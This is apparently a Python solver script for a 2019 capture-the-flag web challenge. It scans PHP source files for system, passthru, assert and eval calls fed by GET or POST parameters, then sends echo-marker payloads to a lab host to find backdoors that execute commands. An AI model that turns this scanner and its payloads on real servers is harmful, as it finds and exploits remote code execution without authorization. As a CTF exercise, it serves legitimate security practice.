#!/usr/bin/env python3
"""
Optimized backdoor scanner - multithreaded with rate limiting
Tests system() and passthru() calls with GET/POST parameters
"""
import os
import re
import requests
import time
import threading
from queue import Queue
from urllib.parse import urljoin

BASE_URL = "http://ea1225ef-4ad1-4818-b4bc-4812aec70cf7.node5.buuoj.cn:81"
SRC_DIR = "/home/kali/workspace/challenges/154_强网杯_2019_高明的黑客/src"
DELAY = 0.3  # per-thread delay
THREADS = 3
MARKER_PREFIX = "MARK"

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
})

# Thread-safe results
results_lock = threading.Lock()
found_backdoors = []
tested_count = 0

def extract_params(content):
    """Extract system/passthru params from PHP content"""
    targets = []

    # Match system($_GET['xxx'] ?? ' ') or system($_POST['xxx'] ?? ' ')
    # Also match system($_GET['xxx']) or system($_POST['xxx'])
    patterns = [
        r"system\s*\(\s*\$_GET\['([a-zA-Z0-9_]+)'\]",
        r"system\s*\(\s*\$_POST\['([a-zA-Z0-9_]+)'\]",
        r"passthru\s*\(\s*\$_GET\['([a-zA-Z0-9_]+)'\]",
        r"passthru\s*\(\s*\$_POST\['([a-zA-Z0-9_]+)'\]",
        r"assert\s*\(\s*\$_GET\['([a-zA-Z0-9_]+)'\]",
        r"assert\s*\(\s*\$_POST\['([a-zA-Z0-9_]+)'\]",
        r"eval\s*\(\s*\$_GET\['([a-zA-Z0-9_]+)'\]",
        r"eval\s*\(\s*\$_POST\['([a-zA-Z0-9_]+)'\]",
    ]

    for pattern in patterns:
        for match in re.finditer(pattern, content):
            param_name = match.group(1)
            # Determine if GET or POST
            if '_GET' in pattern:
                method = 'GET'
            else:
                method = 'POST'
            targets.append({'param': param_name, 'method': method})

    return targets

def scan_php_files():
    """Scan all PHP files and extract testable params"""
    test_cases = []

    for filename in os.listdir(SRC_DIR):
        if not filename.endswith('.php'):
            continue

        filepath = os.path.join(SRC_DIR, filename)

        try:
            with open(filepath, 'r', errors='ignore') as f:
                content = f.read()
        except:
            continue

        params = extract_params(content)

        for p in params:
            test_cases.append({
                'file': filename,
                'param': p['param'],
                'method': p['method'],
                'marker': f"{MARKER_PREFIX}_{len(test_cases):05d}"
            })

    return test_cases

def worker(queue):
    """Worker thread"""
    global tested_count

    while True:
        item = queue.get()
        if item is None:
            break

        url = urljoin(BASE_URL, item['file'])
        marker = item['marker']
        param = item['param']
        method = item['method']

        # Test with echo marker
        payload = f"echo {marker};"

        try:
            time.sleep(DELAY)  # Rate limiting

            if method == 'GET':
                test_url = f"{url}?{param}={payload}"
                r = session.get(test_url, timeout=10)
            else:
                r = session.post(url, data={param: payload}, timeout=10)

            if r.status_code == 429:
                print(f"[429] Rate limited, waiting 30s...")
                time.sleep(30)
                queue.put(item)  # Re-queue
                continue

            if marker in r.text:
                with results_lock:
                    found_backdoors.append({
                        'file': item['file'],
                        'param': param,
                        'method': method,
                        'url': f"{url}?{param}=" if method == 'GET' else f"{url} POST {param}"
                    })
                    print(f"\n[FOUND] {item['file']} {method} {param} responds to marker!")

            with results_lock:
                tested_count += 1
                if tested_count % 200 == 0:
                    print(f"[PROGRESS] Tested {tested_count} cases...")

        except Exception as e:
            pass

        queue.task_done()

def main():
    print("[*] Scanning PHP files for dangerous function calls...")
    test_cases = scan_php_files()
    print(f"[*] Found {len(test_cases)} test cases")

    if not test_cases:
        print("[!] No test cases found!")
        return

    print(f"[*] Starting {THREADS} threads with {DELAY}s delay per request")
    print(f"[*] Estimated time: {len(test_cases) * DELAY / THREADS / 60:.1f} minutes")

    queue = Queue()
    for tc in test_cases:
        queue.put(tc)

    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=worker, args=(queue,))
        t.start()
        threads.append(t)

    queue.join()

    for i in range(THREADS):
        queue.put(None)
    for t in threads:
        t.join()

    print(f"\n[*] Complete! Tested {tested_count} cases")
    print(f"[*] Found {len(found_backdoors)} working backdoors:")

    for b in found_backdoors:
        print(f"  {b['method']} {b['file']} ?{b['param']}=")

    # Save results
    with open('working_backdoors.txt', 'w') as f:
        for b in found_backdoors:
            f.write(f"{b['method']} {b['file']} {b['param']}\n")

if __name__ == "__main__":
    main()
